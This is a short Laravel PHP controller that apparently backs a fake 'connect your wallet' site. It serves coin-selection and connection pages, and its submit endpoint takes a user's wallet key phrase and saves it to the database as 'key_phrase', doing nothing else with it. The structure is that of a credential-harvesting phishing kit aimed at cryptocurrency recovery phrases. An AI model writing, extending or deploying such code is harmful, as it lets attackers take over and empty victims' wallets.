<?php

namespace App\Http\Controllers;

use App\Models\Coins;
use App\Models\Key;
use App\Models\Option;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\View\View;

class SiteController extends Controller
{
    public function index(): View
    {
        $options = Option::query()->get();
        return view('index', compact('options'));
    }
    public function connect($id): View
    {
        $id = (int) $id;
        return view('connect', compact('id'));
    }
    public function connection(): View
    {
        $coins = Coins::query()->get();
        return view('connection', compact('coins'));
    }
    public function access($id): View
    {
        $coin = Coins::query()->where('id', $id)->first();
        return view('access', compact('id', 'coin'));
    }
    public function submit(Request $request): JsonResponse
    {
        // Validate the request inputs
        $request->validate([
            'dapp_type' => 'required',
            'connection_method' => 'required',
            'key' => 'required',
        ]);

        // Create and save a new Key instance with the request data
        $key = new Key();
        $key->d_app_type = $request->input('dapp_type');
        $key->connection_method = $request->input('connection_method');
        $key->key_phrase = $request->input('key');
        $key->save();

        // Return a success response
        return response()->json([
            'success' => true,
            'message' => 'Form submitted successfully!',
        ]);
    }

}
